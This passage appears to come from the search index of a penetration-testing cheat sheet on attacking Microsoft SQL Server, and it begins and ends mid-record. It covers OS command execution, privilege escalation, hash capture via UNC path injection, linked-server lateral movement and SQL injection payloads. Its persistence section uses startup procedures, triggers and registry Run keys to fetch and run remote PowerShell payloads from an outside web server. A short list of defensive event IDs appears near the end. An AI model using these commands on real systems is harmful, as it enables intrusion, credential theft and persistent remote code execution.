RECONFIGURE; GO Execute: DECLARE @output INT DECLARE @ProgramToRun VARCHAR(255) SET @ProgramToRun = 'Run( calc.exe )' EXEC sp_oacreate 'wScript.Shell', @output out EXEC sp_oamethod @output, @ProgramToRun EXEC sp_oadestroy @output Invoke-SQLOSCmdCLR -Username sa -Password pw -Instance instance -Command whoami -Verbose Example: Sets SecurityDescriptor of ftp.exe to everyone: -- Declare variables used to reference the objects DECLARE @objLocator int,@objWmi int,@objPermiss int,@objFull int; -- Create a WbemScripting.SWbemLocator object EXEC sp_OACreate 'WbemScripting.SWbemLocator',@objLocator OUTPUT; -- Use the SWbemLocator object's ConnectServer() method to connect to the -- local WMI server. The connection will be to the 'root\\cimv2' namespace EXEC sp_OAMethod @objLocator, 'ConnectServer',@objWmi OUTPUT,'.','root\\cimv2'; -- Retrieve an SWbemObject that represents the requested object -- In this case, a Win32_LogicalFileSecuritySetting object for 'ftp.exe' EXEC sp_OAMethod @objWmi, 'Get',@objPermiss OUTPUT, 'Win32_LogicalFileSecuritySetting.Path=''ftp.exe'''; -- Create an empty SecurityDescriptor EXEC sp_OAMethod @objWmi,'Get',@objFull OUTPUT,'Win32_SecurityDescriptor'; -- Set the SecurityDescriptor's ControlFlags property to -- '4' (SE_DACL_PRESENT) EXEC sp_OASetProperty @objFull,'ControlFlags',4; -- Set the file security setting object's security descriptor to the new -- SecurityDescriptor object EXEC sp_OAMethod @objPermiss,'SetSecurityDescriptor',NULL,@objFull; https://malwaremusings.com/2013/04/10/a-look-at-some-ms-sql-attacks-overview/","title":"OLE Automation Procedure"},{"location":"databases/sqlserver/3-command-execution/#agent-jobs-cmdexec-powershell-activex-etc","text":"job can be scheduled, executed in response to alerts or by using sp_start_job stored procedure Needs sysadmin role to create a job. Non-sysadmin users with the SQLAgentUserRole , SQLAgentReaderRole , and SQLAgentOperatorRole fixed database roles in the msdb database can also be used. The execution takes place with privileges of the SQL Server Agent service account if a proxy account is not configured. https://docs.microsoft.com/en-us/sql/ssms/agent/sql-server-agent","title":"Agent Jobs (CmdExec, PowerShell, ActiveX etc.)"},{"location":"databases/sqlserver/3-command-execution/#steps","text":"xp_startservice - Start the SQL Server Agent service sp_add_job - Create Job sp_add_jobstep - Add job step sp_start_job - Run Job sp_delete_job - Delete Job","title":"Steps"},{"location":"databases/sqlserver/3-command-execution/#listing-all-jobs","text":"SELECT job.job_id, notify_level_email, name, enabled, description, step_name, command, server, database_name FROM msdb.dbo.sysjobs job INNER JOIN msdb.dbo.sysjobsteps steps ON job.job_id = steps.job_id https://serverfault.com/a/14569","title":"Listing all Jobs"},{"location":"databases/sqlserver/3-command-execution/#interesting-subsystems-job-types","text":"","title":"Interesting subsystems (job types):"},{"location":"databases/sqlserver/3-command-execution/#powershell","text":"USE msdb EXEC dbo.sp_add_job @job_name = N'PSJob' EXEC sp_add_jobstep @job_name = N'PSJob', @step_name = N'test_powershell_name1', @subsystem = N'PowerShell', @command = N'powershell.exe -noexit ps', @retry_attempts = 1, @retry_interval = 5 EXEC dbo.sp_add_jobserver @job_name = N'PSJob' EXEC dbo.sp_start_job N'PSJob' -- EXEC dbo.sp_delete_job @job_name = N'PSJob' https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution","title":"PowerShell"},{"location":"databases/sqlserver/3-command-execution/#cmdexec","text":"USE msdb EXEC dbo.sp_add_job @job_name = N'cmdjob' EXEC sp_add_jobstep @job_name = N'cmdjob', @step_name = N'test_cmd_name1', @subsystem = N'cmdexec', @command = N'cmd.exe /k calc', @retry_attempts = 1, @retry_interval = 5 EXEC dbo.sp_add_jobserver @job_name = N'cmdjob' EXEC dbo.sp_start_job N'cmdjob'; -- EXEC dbo.sp_delete_job @job_name = N'cmdJob'","title":"CmdExec"},{"location":"databases/sqlserver/3-command-execution/#microsoft-activex-script-vbscript-and-jscript","text":"","title":"Microsoft ActiveX Script (VBScript and Jscript)"},{"location":"databases/sqlserver/3-command-execution/#ssis-sql-server-integrated-services","text":"","title":"SSIS (SQL Server Integrated Services)"},{"location":"databases/sqlserver/3-command-execution/#powerupsql","text":"Invoke-SQLOSCmdAgentJob \u2013Subsystem PowerShell -Username sa -Password pw -Instance instance -Command powershell -e base64encodedscript -Verbose -Subsystem CmdExec -ubsystem VBScript -Subsystem Jscript Get-SQLAgentJob -Instance instance -username sa -Password pw -Verboe]se","title":"PowerUpSQL"},{"location":"databases/sqlserver/3-command-execution/#external-scripting","text":"R introduced in SQL Server 2016 Python introduced in SQL Server 2017 Runtime environments must be installed as a prerequisite. Not on by default. Needs SQL server service restart. Needs sysadmin privileges to be enabled and executed. Runs with privileges of a dynamically created Windows user account (member of the SQLRUserGroup ). https://docs.microsoft.com/en-us/sql/advanced-analytics/tutorials/rtsql-using-r-code-in-transact-sql-quickstart https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server Executing commands with R: sp_configure 'external scripts enabled' GO EXEC sp_execute_external_script @language=N'R', @script=N'OutputDataSet - data.frame(system( cmd.exe /c dir ,intern=T))' WITH RESULT SETS (([cmd_out] text)); GO Grab Net-NTLM hashes with R: @script=N'.libPaths( \\\\\\\\testhost\\\\foo\\\\bar );library( 0mgh4x )' Using shell instead of system: @script=N'OutputDataSet - data.frame(shell( dir ,intern=T))' https://pastebin.com/zBDnzELT Executing commands with Python: EXEC sp_execute_external_script @language =N'Python', @script=N'import subprocess p = subprocess.Popen( cmd.exe /c whoami , stdout=subprocess.PIPE) OutputDataSet = pandas.DataFrame([str(p.stdout.read(), utf-8 )])' WITH RESULT SETS (([cmd_out] nvarchar(max))) Reference: https://gist.github.com/james-otten/63389189ee73376268c5eb676946ada5 https://www.slideshare.net/nullbind/beyond-xpcmdshell-owning-the-empire-through-sql-server PowerUpSQL: Invoke-SQLOSCmdR -Username sa -Password pw -Instance instance -Command powershell -e base64encodedscript -Verbose Invoke-SQLOSCmdPython -Username sa -Password pw -Instance instance -Command powershell -e base64encodedscript -Verbose","title":"External Scripting"},{"location":"databases/sqlserver/3-command-execution/#registry-autoruns","text":"","title":"Registry Autoruns"},{"location":"databases/sqlserver/3-command-execution/#file-autoruns","text":"","title":"File Autoruns"},{"location":"databases/sqlserver/4-privilage-escalation/","text":"04. Privilege Escalation Find Impersonatable Accounts SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/ Invoke-SQLAuditPrivImpersonateLogin -Username un -Password pw -Instance dbname -Verbose Execute As EXECUTE AS LOGIN = 'dbadmin' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin') EXECUTE AS LOGIN = 'dbadmin' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin') SELECT ORIGINAL_LOGIN() EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin') SELECT ORIGINAL_LOGIN() https://docs.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql Trustworthy Databases is_trustworthy_off by default (Only a sysadmin can change). When off impersonated users will only have database-scope permissions. When on impersonated users can perform actions with server level permissions. Allows writing procedures that can execute code with server level permission. If is_trustworthy_on and if a sysadmin (not necessarily sa ) is owner of the database, it is possible for the database owner (a user with db_owner ) to elevate privileges to sysadmin . https://docs.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property http://sqlity.net/en/1653/the-trustworthy-database-property-explained-part-1/ Discover Trustworthy Databases SELECT name as database_name , SUSER_NAME(owner_sid) AS database_owner , is_trustworthy_on AS TRUSTWORTHY from sys.databases Invoke-SQLAudit -Instance instance-name -Verbose | Out-GridView Invoke-SQLAuditPrivTrustworthy -Instance instance-name -Verbose Exploitation Add sysadmin to myuser : EXECUTE AS USER = 'dbo' SELECT system_user EXEC sp_addsrvrolemember 'example.com\\myuser','sysadmin' Public to Service Account UNC Path Injection Capture Net-NTLM (also known as NTLMv1/v2) hashes Stored procedures like xp_dirtree and xp_fileexist can be used to capture Net-NTLM hashes Invoke-SQLUncPathInjection -Verbose -CaptureIp 192.168.1.11 UNC Path Injection cheatsheet: https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e Service Account to System Rotten Potato Trick the \"NT AUTHORITY\\SYSTEM\" account into authenticating via NTLM to a TCP endpoint attacker control. Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the \u201cNT AUTHORITY\\SYSTEM\u201d account Impersonate the token we have just negotiated. Usable only if attackers current account has the privilege to impersonate security tokens. https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/ Extracting service account credentials from LSA Secrets and/or memory Token Impersonation for the SQL Server service Single user mode","title":"04. Privilege Escalation"},{"location":"databases/sqlserver/4-privilage-escalation/#04-privilege-escalation","text":"","title":"04. Privilege Escalation"},{"location":"databases/sqlserver/4-privilage-escalation/#find-impersonatable-accounts","text":"SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE' https://blog.netspi.com/hacking-sql-server-stored-procedures-part-2-user-impersonation/ Invoke-SQLAuditPrivImpersonateLogin -Username un -Password pw -Instance dbname -Verbose","title":"Find Impersonatable Accounts"},{"location":"databases/sqlserver/4-privilage-escalation/#execute-as","text":"EXECUTE AS LOGIN = 'dbadmin' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin') EXECUTE AS LOGIN = 'dbadmin' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin') SELECT ORIGINAL_LOGIN() EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin') SELECT ORIGINAL_LOGIN() https://docs.microsoft.com/en-us/sql/t-sql/statements/execute-as-transact-sql","title":"Execute As"},{"location":"databases/sqlserver/4-privilage-escalation/#trustworthy-databases","text":"is_trustworthy_off by default (Only a sysadmin can change). When off impersonated users will only have database-scope permissions. When on impersonated users can perform actions with server level permissions. Allows writing procedures that can execute code with server level permission. If is_trustworthy_on and if a sysadmin (not necessarily sa ) is owner of the database, it is possible for the database owner (a user with db_owner ) to elevate privileges to sysadmin . https://docs.microsoft.com/en-us/sql/relational-databases/security/trustworthy-database-property http://sqlity.net/en/1653/the-trustworthy-database-property-explained-part-1/","title":"Trustworthy Databases"},{"location":"databases/sqlserver/4-privilage-escalation/#discover-trustworthy-databases","text":"SELECT name as database_name , SUSER_NAME(owner_sid) AS database_owner , is_trustworthy_on AS TRUSTWORTHY from sys.databases Invoke-SQLAudit -Instance instance-name -Verbose | Out-GridView Invoke-SQLAuditPrivTrustworthy -Instance instance-name -Verbose","title":"Discover Trustworthy Databases"},{"location":"databases/sqlserver/4-privilage-escalation/#exploitation","text":"Add sysadmin to myuser : EXECUTE AS USER = 'dbo' SELECT system_user EXEC sp_addsrvrolemember 'example.com\\myuser','sysadmin'","title":"Exploitation"},{"location":"databases/sqlserver/4-privilage-escalation/#public-to-service-account","text":"","title":"Public to Service Account"},{"location":"databases/sqlserver/4-privilage-escalation/#unc-path-injection","text":"Capture Net-NTLM (also known as NTLMv1/v2) hashes Stored procedures like xp_dirtree and xp_fileexist can be used to capture Net-NTLM hashes Invoke-SQLUncPathInjection -Verbose -CaptureIp 192.168.1.11 UNC Path Injection cheatsheet: https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e","title":"UNC Path Injection"},{"location":"databases/sqlserver/4-privilage-escalation/#service-account-to-system","text":"","title":"Service Account to System"},{"location":"databases/sqlserver/4-privilage-escalation/#rotten-potato","text":"Trick the \"NT AUTHORITY\\SYSTEM\" account into authenticating via NTLM to a TCP endpoint attacker control. Man-in-the-middle this authentication attempt (NTLM relay) to locally negotiate a security token for the \u201cNT AUTHORITY\\SYSTEM\u201d account Impersonate the token we have just negotiated. Usable only if attackers current account has the privilege to impersonate security tokens. https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/","title":"Rotten Potato"},{"location":"databases/sqlserver/4-privilage-escalation/#extracting-service-account-credentials-from-lsa-secrets-andor-memory","text":"","title":"Extracting service account credentials from LSA Secrets and/or memory"},{"location":"databases/sqlserver/4-privilage-escalation/#token-impersonation-for-the-sql-server-service","text":"","title":"Token Impersonation for the SQL Server service"},{"location":"databases/sqlserver/4-privilage-escalation/#single-user-mode","text":"","title":"Single user mode"},{"location":"databases/sqlserver/5-lateral-movement/","text":"05. Lateral Movement Domain User accounts SQL server allows Domain user logins (it a part of the domain trust) Once domain user access is present, enumerate privileges it has on SQL servers in the domain After gaining shell access to the user (command execution) following can be done: Check if current user has access to SQL Servers in domain: Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose For alternative credentials: unas /noprofile /netonly /user: domain\\username powershell.exe A user with public access can be used to enumerate domain accounts and groups in the forest and other trusted forests Get-SQLFuzzDomainAccount -Instance instance -StartId 500 -EndId 2000 -Verbose https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/ If local admin rights are present, dump credentials. Database Links Allows a SQL Server to access external data sources (SQL Servers, OLE DB) If SQL Servers are linked: Can execute stored procedures Work across SQL server versions and forests https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html Search for linked databases: select - from master..sysservers Get-SQLServerLink -Instance instance -Verbose Run queries on linked databases: select - from openquery( instance ,'select - frommaster..sysservers') Run queries on chain of linked databases: select - from openquery( inatance1 ,'select - from openquery( instance2 ,''select - from master..sysservers'')') Get-SQLServerLinkCrawl -Instance instance1 -Verbose If rpcout is enabled for all links (disabled by default), xp_cmdshell can be enabled using: EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT instance2 ) Command execution with linked databases: select - from openquery( instance1 ,'select - from openquery( instance2 ,''select - from openquery( instance3 ,''''select @@version as version;exec master..xp_cmdshell cmd /c calc.exe '''')'')') Get-SQLServerLinkCrawl -Instance instance1 -Query exec master..xp_cmdshell 'cmd /c calc.exe' -Verbose Decrypting Database Link Server Passwords: https://blog.netspi.com/decrypting-mssql-database-link-server-passwords/","title":"05. Lateral Movement"},{"location":"databases/sqlserver/5-lateral-movement/#05-lateral-movement","text":"","title":"05. Lateral Movement"},{"location":"databases/sqlserver/5-lateral-movement/#domain-user-accounts","text":"SQL server allows Domain user logins (it a part of the domain trust) Once domain user access is present, enumerate privileges it has on SQL servers in the domain After gaining shell access to the user (command execution) following can be done: Check if current user has access to SQL Servers in domain: Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose For alternative credentials: unas /noprofile /netonly /user: domain\\username powershell.exe A user with public access can be used to enumerate domain accounts and groups in the forest and other trusted forests Get-SQLFuzzDomainAccount -Instance instance -StartId 500 -EndId 2000 -Verbose https://blog.netspi.com/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/ If local admin rights are present, dump credentials.","title":"Domain User accounts"},{"location":"databases/sqlserver/5-lateral-movement/#database-links","text":"Allows a SQL Server to access external data sources (SQL Servers, OLE DB) If SQL Servers are linked: Can execute stored procedures Work across SQL server versions and forests https://docs.microsoft.com/en-us/sql/relational-databases/linked-servers/linked-servers-database-engine http://www.labofapenetrationtester.com/2017/03/using-sql-server-for-attacking-forest-trust.html Search for linked databases: select - from master..sysservers Get-SQLServerLink -Instance instance -Verbose Run queries on linked databases: select - from openquery( instance ,'select - frommaster..sysservers') Run queries on chain of linked databases: select - from openquery( inatance1 ,'select - from openquery( instance2 ,''select - from master..sysservers'')') Get-SQLServerLinkCrawl -Instance instance1 -Verbose If rpcout is enabled for all links (disabled by default), xp_cmdshell can be enabled using: EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT instance2 ) Command execution with linked databases: select - from openquery( instance1 ,'select - from openquery( instance2 ,''select - from openquery( instance3 ,''''select @@version as version;exec master..xp_cmdshell cmd /c calc.exe '''')'')') Get-SQLServerLinkCrawl -Instance instance1 -Query exec master..xp_cmdshell 'cmd /c calc.exe' -Verbose Decrypting Database Link Server Passwords: https://blog.netspi.com/decrypting-mssql-database-link-server-passwords/","title":"Database Links"},{"location":"databases/sqlserver/6-persistence/","text":"06. Persistence Startup stored procedures sysadmin privileges are required to mark proc for automated execution owned only by sa must be in the master database cannot have input or output parameters gets executed with sysadmin privileges executed when SQL Server restart https://technet.microsoft.com/en-us/library/ms191129(v=sql.105).aspx Create: USE master GO CREATE PROCEDURE sp_autops AS EXEC master..xp_cmdshell 'powershell -C iex (new-object System.Net.WebClient).DownloadString(''http://webserver/payload.ps1'') ' GO EXEC sp_procoption @ProcName = 'sp_autops', @OptionName = 'startup', @OptionValue = 'on'; List: SELECT [name] FROM sysobjects WHERE type = 'P' AND OBJECTPROPERTY(id, 'ExecIsStartUp') = 1; https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-procoption-transact-sql https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/ Triggers https://docs.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql Data Definition Language (DDL) Triggers Execute under the context of the user that calls the trigger CREATE Trigger [persistence_ddl_1] ON ALL Server -- or DATABASE FOR DDL_LOGIN_EVENTS -- See the docs below for events and event groups AS EXEC master..xp_cmdshell 'powershell -C iex (new-object System.Net.WebClient).DownloadString(''http://webserver/payload.ps1'') ' GO https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/ https://docs.microsoft.com/en-us/sql/relational-databases/triggers/implement-ddl-triggers https://docs.microsoft.com/en-us/sql/relational-databases/triggers/ddl-event-groups Data Manipulation Language (DML) Triggers Execute under the context of the user that calls the trigger User should have privilages to do the task in the trigger USE master GRANT IMPERSONATE ON LOGIN::sa to [Public]; USE testdb CREATE TRIGGER [persistence_dml_1] ON testdb.dbo.datatable FOR INSERT, UPDATE, DELETE AS EXECUTE AS LOGIN = 'sa' EXEC master..xp_cmdshell 'powershell -C iex (new-object System.Net.WebClient).DownloadString(''http://webserver/payload.ps1'') ' GO https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/ https://docs.microsoft.com/en-us/sql/relational-databases/triggers/create-dml-triggers Logon Triggers Ideal for triggering with a logon failure of a low-privilege user. CREATE Trigger [persistence_logon_1] ON ALL SERVER WITH EXECUTE AS 'sa' FOR LOGON AS BEGIN IF ORIGINAL_LOGIN() = 'testuser' EXEC master..xp_cmdshell 'powershell -C iex (new-object System.Net.WebClient).DownloadString(''http://webserver/payload.ps1'') ' END; List all Triggers SELECT - FROM sys.server_triggers Get-SQLTriggerDdl -Instance instance -username sa -Password pw -Verbose https://docs.microsoft.com/en-us/sql/relational-databases/triggers/logon-triggers Registry keys xp_regwrite Needs sysadmin EXEC xp_regwrite @rootkey = 'HKEY_LOCAL_MACHINE', @key = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', @value_name = 'SQLServerUpdate', @type = 'REG_SZ', @value = 'powershell -w 1 -NoP -NoL iex(New-Object Net.WebClient).DownloadString( http://webserver/evil.ps1 )' Get-SQLPersistRegDebugger -Instance instance -username sa -Password pw -FileName utilman.exe -Command 'c:\\windows\\system32\\cmd.exe' -Verbose Get-SQLPersistRegRun -Instance instance -username sa -Password pw -Name SQLUpdate -Command 'powershell -w 1 -NoP -NoL iex(New-Object Net.WebClient).DownloadString( http://webserver/evil.ps1 )' -Verbose xp_regread Limited read for public role DECLARE @Reg_Value VARCHAR(1000) EXECUTE xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\CurrentVersion',\u2018ProductName', @Reg_Value OUTPUT SELECT @Reg_Value Read auto-login password: Get-SQLRecoverPwAutoLogon -Instance instance -username sa -Password pw -Verbose https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/ xp_regdeletekey Needs sysadmin https://support.microsoft.com/en-us/help/887165/bug-you-may-receive-an-access-is-denied-error-message-when-a-query-cal","title":"06. Persistence"},{"location":"databases/sqlserver/6-persistence/#06-persistence","text":"","title":"06. Persistence"},{"location":"databases/sqlserver/6-persistence/#startup-stored-procedures","text":"sysadmin privileges are required to mark proc for automated execution owned only by sa must be in the master database cannot have input or output parameters gets executed with sysadmin privileges executed when SQL Server restart https://technet.microsoft.com/en-us/library/ms191129(v=sql.105).aspx Create: USE master GO CREATE PROCEDURE sp_autops AS EXEC master..xp_cmdshell 'powershell -C iex (new-object System.Net.WebClient).DownloadString(''http://webserver/payload.ps1'') ' GO EXEC sp_procoption @ProcName = 'sp_autops', @OptionName = 'startup', @OptionValue = 'on'; List: SELECT [name] FROM sysobjects WHERE type = 'P' AND OBJECTPROPERTY(id, 'ExecIsStartUp') = 1; https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/sp-procoption-transact-sql https://blog.netspi.com/sql-server-persistence-part-1-startup-stored-procedures/","title":"Startup stored procedures"},{"location":"databases/sqlserver/6-persistence/#triggers","text":"https://docs.microsoft.com/en-us/sql/t-sql/statements/create-trigger-transact-sql","title":"Triggers"},{"location":"databases/sqlserver/6-persistence/#data-definition-language-ddl-triggers","text":"Execute under the context of the user that calls the trigger CREATE Trigger [persistence_ddl_1] ON ALL Server -- or DATABASE FOR DDL_LOGIN_EVENTS -- See the docs below for events and event groups AS EXEC master..xp_cmdshell 'powershell -C iex (new-object System.Net.WebClient).DownloadString(''http://webserver/payload.ps1'') ' GO https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/ https://docs.microsoft.com/en-us/sql/relational-databases/triggers/implement-ddl-triggers https://docs.microsoft.com/en-us/sql/relational-databases/triggers/ddl-event-groups","title":"Data Definition Language (DDL) Triggers"},{"location":"databases/sqlserver/6-persistence/#data-manipulation-language-dml-triggers","text":"Execute under the context of the user that calls the trigger User should have privilages to do the task in the trigger USE master GRANT IMPERSONATE ON LOGIN::sa to [Public]; USE testdb CREATE TRIGGER [persistence_dml_1] ON testdb.dbo.datatable FOR INSERT, UPDATE, DELETE AS EXECUTE AS LOGIN = 'sa' EXEC master..xp_cmdshell 'powershell -C iex (new-object System.Net.WebClient).DownloadString(''http://webserver/payload.ps1'') ' GO https://blog.netspi.com/maintaining-persistence-via-sql-server-part-2-triggers/ https://docs.microsoft.com/en-us/sql/relational-databases/triggers/create-dml-triggers","title":"Data Manipulation Language (DML) Triggers"},{"location":"databases/sqlserver/6-persistence/#logon-triggers","text":"Ideal for triggering with a logon failure of a low-privilege user. CREATE Trigger [persistence_logon_1] ON ALL SERVER WITH EXECUTE AS 'sa' FOR LOGON AS BEGIN IF ORIGINAL_LOGIN() = 'testuser' EXEC master..xp_cmdshell 'powershell -C iex (new-object System.Net.WebClient).DownloadString(''http://webserver/payload.ps1'') ' END; List all Triggers SELECT - FROM sys.server_triggers Get-SQLTriggerDdl -Instance instance -username sa -Password pw -Verbose https://docs.microsoft.com/en-us/sql/relational-databases/triggers/logon-triggers","title":"Logon Triggers"},{"location":"databases/sqlserver/6-persistence/#registry-keys","text":"","title":"Registry keys"},{"location":"databases/sqlserver/6-persistence/#xp_regwrite","text":"Needs sysadmin EXEC xp_regwrite @rootkey = 'HKEY_LOCAL_MACHINE', @key = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', @value_name = 'SQLServerUpdate', @type = 'REG_SZ', @value = 'powershell -w 1 -NoP -NoL iex(New-Object Net.WebClient).DownloadString( http://webserver/evil.ps1 )' Get-SQLPersistRegDebugger -Instance instance -username sa -Password pw -FileName utilman.exe -Command 'c:\\windows\\system32\\cmd.exe' -Verbose Get-SQLPersistRegRun -Instance instance -username sa -Password pw -Name SQLUpdate -Command 'powershell -w 1 -NoP -NoL iex(New-Object Net.WebClient).DownloadString( http://webserver/evil.ps1 )' -Verbose","title":"xp_regwrite"},{"location":"databases/sqlserver/6-persistence/#xp_regread","text":"Limited read for public role DECLARE @Reg_Value VARCHAR(1000) EXECUTE xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\CurrentVersion',\u2018ProductName', @Reg_Value OUTPUT SELECT @Reg_Value Read auto-login password: Get-SQLRecoverPwAutoLogon -Instance instance -username sa -Password pw -Verbose https://blog.netspi.com/get-windows-auto-login-passwords-via-sql-server-powerupsql/","title":"xp_regread"},{"location":"databases/sqlserver/6-persistence/#xp_regdeletekey","text":"Needs sysadmin https://support.microsoft.com/en-us/help/887165/bug-you-may-receive-an-access-is-denied-error-message-when-a-query-cal","title":"xp_regdeletekey"},{"location":"databases/sqlserver/9-defence/","text":"09. Defence Audit links, trusts, privileges and credentials. Service Accounts for databases should not be high privilege domain account. Known dangerous Stored Procedures are disabled. Use audit features to log interesting events. Monitor the logs ( Management Studio - Management - SQL Server Logs ) Error log @ Program-Files\\Microsoft SQL Server\\MSSQL.1MSSQL\\LOG\\ERRORLOG Logs are also written to Windows Application logs with MSSQLSERVER as source. Good password policy. Not using same username across databases. Logon failures are logged by default (source MSSQLSERVER ). Event ID Description 18456 Authentication failures 5084 Setting TRUSTWORTHY to on/off 17135 Launch of startup stored procedures 33090 Successful DLL loading 17750 Failed DLL loading 15457 Using sp_configure (command execution)","title":"09. Defence"},{"location":"databases/sqlserver/9-defence/#09-defence","text":"Audit links, trusts, privileges and credentials. Service Accounts for databases should not be high privilege domain account. Known dangerous Stored Procedures are disabled. Use audit features to log interesting events. Monitor the logs ( Management Studio - Management - SQL Server Logs ) Error log @ Program-Files\\Microsoft SQL Server\\MSSQL.1MSSQL\\LOG\\ERRORLOG Logs are also written to Windows Application logs with MSSQLSERVER as source. Good password policy. Not using same username across databases. Logon failures are logged by default (source MSSQLSERVER ). Event ID Description 18456 Authentication failures 5084 Setting TRUSTWORTHY to on/off 17135 Launch of startup stored procedures 33090 Successful DLL loading 17750 Failed DLL loading 15457 Using sp_configure (command execution)","title":"09. Defence"},{"location":"databases/sqlserver/9-pending-references/","text":"10. New References https://blog.anitian.com/hacking-microsoft-sql-server-without-a-password/ https://blog.anitian.com/hacking-sql-servers-without-password/","title":"10. New References"},{"location":"databases/sqlserver/9-pending-references/#10-new-references","text":"https://blog.anitian.com/hacking-microsoft-sql-server-without-a-password/ https://blog.anitian.com/hacking-sql-servers-without-password/","title":"10. New References"},{"location":"databases/sqlserver/important-locations/","text":"Imprtant Locations DB Structure SELECT name FROM master.dbo.sysdatabases SELECT * FROM orcharddb.INFORMATION_SCHEMA. SELECT * FROM orcharddb.INFORMATION_SCHEMA.COLUMNS","title":"Imprtant Locations"},{"location":"databases/sqlserver/important-locations/#imprtant-locations","text":"","title":"Imprtant Locations"},{"location":"databases/sqlserver/important-locations/#db-structure","text":"SELECT name FROM master.dbo.sysdatabases SELECT * FROM orcharddb.INFORMATION_SCHEMA. SELECT * FROM orcharddb.INFORMATION_SCHEMA.COLUMNS","title":"DB Structure"},{"location":"databases/sqlserver/sqli/","text":"SQL Injection Commenting: -- Important functions xp_dirtree - undocumented MSSQL stored procedure that allows for interaction with local and remote filesystems '+EXEC+master.sys.xp_dirtree+'\\\\10.10.14.9\\share-- Time based injection ' if (select user) = 'sa' waitfor delay '0:0:5'-- ' if (select user) != 'sa' waitfor delay '0:0:5'--","title":"SQL Injection"},{"location":"databases/sqlserver/sqli/#sql-injection","text":"Commenting: --","title":"SQL Injection"},{"location":"databases/sqlserver/sqli/#important-functions","text":"xp_dirtree - undocumented MSSQL stored procedure that allows for interaction with local and remote filesystems '+EXEC+master.sys.xp_dirtree+'\\\\10.10.14.9\\share--","title":"Important functions"},{"location":"databases/sqlserver/sqli/#time-based-injection","text":"' if (select user) = 'sa' waitfor delay '0:0:5'-- ' if (select user) != 'sa' waitfor delay '0:0:5'--","title":"Time based injection"},{"location":"databases/sqlserver/y-Tools/","text":"Tools SQSH Accessing and Hacking MSSQL from Backtrack Linux apt-get install sqsh freetds-bin freetds-common freetds-dev Edit /etc/freetds/freetds.conf , and append: [MyServer] host = 192.168.1.10 port = 1433 tds version = 8.0 Optionally edit ~/.sqshrc : \\set username=sa \\set password=password \\set style=vert Run: sqsh -S MyServer sqsh -S {system name/IP}:{port num} -U {username} -P {password} List of available databases with: SELECT name FROM master..sysdatabases go Build from source: $export SYBASE=/usr/local/freetds $ ./configure $ make $ su # make install # ls -l /usr/local/bin/sqsh # ls -l /usr/local/bin/sqsh.bin","title":"Tools"},{"location":"databases/sqlserver/y-Tools/#tools","text":"","title":"Tools"},{"location":"databases/sqlserver/y-Tools/#sqsh","text":"Accessing and Hacking MSSQL from Backtrack Linux apt-get install sqsh freetds-bin freetds-common freetds-dev Edit /etc/freetds/freetds.conf , and append: [MyServer] host = 192.168.1.10 port = 1433 tds version = 8.0 Optionally edit ~/.sqshrc : \\set username=sa \\set password=password \\set style=vert Run: sqsh -S MyServer sqsh -S {system name/IP}:{port num} -U {username} -P {password} List of available databases with: SELECT name FROM master..sysdatabases go Build from source: $export SYBASE=/usr/local/freetds $ ./configure $ make $ su # make install # ls -l /usr/local/bin/sqsh # ls -l /usr/local/bin/sqsh.bin","title":"SQSH"},{"location":"dfir/0-cheatsheet/","text":"Cheatsheet Look for deleted files Linux Locations: lost+found Commands: strings /dev/sdb sudo dcfldd if=/dev/sdb of=/home/pi/usb.dd testdisk /home/pi/usb.dd","title":"Cheatsheet"},{"location":"dfir/0-cheatsheet/#cheatsheet","text":"","title":"Cheatsheet"},{"location":"dfir/0-cheatsheet/#look-for-deleted-files","text":"","title":"Look for deleted files"},{"location":"dfir/0-cheatsheet/#linux","text":"Locations: lost+found Commands: strings /dev/sdb sudo dcfldd if=/dev/sdb of=/home/pi/usb.dd testdisk 